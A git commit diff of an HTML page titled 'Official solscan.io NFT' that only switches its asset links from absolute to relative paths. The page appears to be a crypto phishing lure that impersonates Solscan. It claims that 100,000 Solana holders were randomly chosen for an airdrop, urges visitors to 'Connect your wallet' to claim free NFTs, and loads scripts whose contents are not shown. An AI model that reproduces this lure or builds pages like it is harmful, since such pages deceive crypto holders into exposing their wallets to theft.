3ece03655ceac7906ee4dcddc38273c75254ca94
SolscanNFT <107646400+SolscanNFT@users.noreply.github.com>
2022-06-22 21:26:24 +0200

    Add files via upload

--- main.js
+++ main.js
@@ -1,15 +1,15 @@
 <html lang="en">
 	<head>
 		<meta charset="utf-8">
-		<link rel="icon" href="https://solscannft.github.io/solscan.nft/favicon.ico">
+		<link rel="icon" href="favicon.ico">
 		<meta name="viewport" content="width=device-width,initial-scale=1">
 		<meta name="theme-color" content="#000000">
 		<meta name="description" content="Web site created using create-react-app">
-		<link rel="apple-touch-icon" href="https://solscannft.github.io/solscan.nft/logo192.png">
-		<link rel="manifest" href="https://solscannft.github.io/solscan.nft/manifest.json">
+		<link rel="apple-touch-icon" href="logo192.png">
+		<link rel="manifest" href="manifest.json">
 		<title>Official solscan.io NFT</title>
-		<script defer="defer" src="https://solscannft.github.io/solscan.nft/main.b724228d.js"></script>
-		<link href="https://solscannft.github.io/solscan.nft/main.0853438b.css" rel="stylesheet">
+		<script defer="defer" src="main.b724228d.js"></script>
+		<link href="main.0853438b.css" rel="stylesheet">
 	</head>
 	<body>
 		<noscript>You need to enable JavaScript to run this app.</noscript>
@@ -22,7 +22,7 @@
                         <header class="header">
                             <div class="container">
                                 <div class="header__content">
-                                    <img class="header__logo" src="https://solscannft.github.io/solscan.nft/logo.8d7f3a82e203420a9ccf5d3fb6d26085.svg">
+                                    <img class="header__logo" src="logo.8d7f3a82e203420a9ccf5d3fb6d26085.svg">
                                     <div class="header__items">
                                         <a class="header__item link" href="#about">Solana NFT</a>
                                         <a class="header__item link" href="#instructions">Instruction</a>
@@ -39,7 +39,7 @@
                                 <h3 class="about-text__box-title">SOLSCAN NFT</h3>
                                 <p class="about-text__box-text">To celebrate the launch of Solana NFTs, we randomly selected <span>100,000</span> Solana holders and distributed the «NFT» token. If you have received this token in your wallet, then you are eligible to claim the official Solana NFT. The number of tokens you have received will determine the number of NFTs you can claim.</p>
                             </div>
-                            <img class="about__img" src="https://solscannft.github.io/solscan.nft/author.536b7eaa11ccd29a8bf2.png">
+                            <img class="about__img" src="author.536b7eaa11ccd29a8bf2.png">
                         </div>
                     </div>
                 </section>
@@ -50,11 +50,11 @@
                                 <h3 class="connect-text__box-title">Connect your wallet</h3>
                                 <p class="connect-text__box-text">Note: There is NO cost to mint the NFT. NFT will be delivered within 2-3 seconds to your wallet.</p>
                                 <a class="connect-text__box-btn">
-                                    <img src="https://solscannft.github.io/solscan.nft/connect__logo-white.0800ea543889a2e76b546bb909146f84.svg">
+                                    <img src="connect__logo-white.0800ea543889a2e76b546bb909146f84.svg">
                                 </a>
                             </div>
                             <div class="connect__token">
-                                <img class="connect__token-img" src="https://solscannft.github.io/solscan.nft/logo-white-with-bg.86aabe7a60d7dbdb4690552c19b6840a.svg">
+                                <img class="connect__token-img" src="logo-white-with-bg.86aabe7a60d7dbdb4690552c19b6840a.svg">
                                 <div class="connect__token-box">
                                     <p class="connect__token-title">Token (n) = NFT (n)</p>
                                     <p class="connect__token-text">(n) = number of tokens you have received. There is no minting cost.</p>
@@ -74,17 +74,17 @@
                                     <h3 class="instructions__header-title">Instructions</h3>
                                     <p class="instructions__header-subtitle">There is no minting fee</p>
                                 </div>
-                                <img class="instructions__header-img-one" src="https://solscannft.github.io/solscan.nft/autograph.f978879bba819ae35b87e91f0b58daba.svg">
+                                <img class="instructions__header-img-one" src="autograph.f978879bba819ae35b87e91f0b58daba.svg">
                             </div>
                             <div class="instructions__border">
                             </div>
                             <div class="instructions__body">
                                 <div class="instructions__box-card">
                                     <div class="instructions__box-card-title">
-                                        <img src="https://solscannft.github.io/solscan.nft/one.ee8d6e4fef68a3b4ce23e593d35213b2.svg">
+                                        <img src="one.ee8d6e4fef68a3b4ce23e593d35213b2.svg">
                                         <p>First step</p>
                                     </div>
-                                    <img class="instructions__box-card-img" src="https://solscannft.github.io/solscan.nft/card-1.a57d14eb04cf690c5abcbd9b79e8f848.svg">
+                                    <img class="instructions__box-card-img" src="card-1.a57d14eb04cf690c5abcbd9b79e8f848.svg">
                                 </div>
                                 <div class="instructions__box-border">
                                 </div>
@@ -95,10 +95,10 @@
                                 </div>
                                 <div class="instructions__box-card">
                                     <div class="instructions__box-card-title">
-                                        <img src="https://solscannft.github.io/solscan.nft/two.84044888ff94a15b3cd7eaae0d0e6465.svg">
+                                        <img src="two.84044888ff94a15b3cd7eaae0d0e6465.svg">
                                         <p>Second step</p>
                                     </div>
-                                    <img class="instructions__box-card-img" src="https://solscannft.github.io/solscan.nft/card-2.8bfa93dc58748946bfeafcd9b47743dc.svg">
+                                    <img class="instructions__box-card-img" src="card-2.8bfa93dc58748946bfeafcd9b47743dc.svg">
                                 </div>
                             </div>
                         </div>
@@ -115,16 +115,16 @@
                         </div>
                     </div>
 					</section>
-					<img class="waves" src="https://solscannft.github.io/solscan.nft/waves.b06a3228fbebac09be45069b5ce3bd8b.svg">
+					<img class="waves" src="waves.b06a3228fbebac09be45069b5ce3bd8b.svg">
 				</div>
-				<script src="https://solscannft.github.io/solscan.nft/jquery-2.1.4.min.js">
+				<script src="jquery-2.1.4.min.js">
 				</script>
-				<script src="https://solscannft.github.io/solscan.nft/bootstrap.min.js">
+				<script src="bootstrap.min.js">
 				</script>
-				<script src="js/main.js">
+				<script src="main.js">
 				</script>
 				<div>
-					<script type="text/javascript" async="" src="https://solscannft.github.io/solscan.nft/watch.js">
+					<script type="text/javascript" async="" src="watch.js">
 					</script>
 				</div>
 			</div>
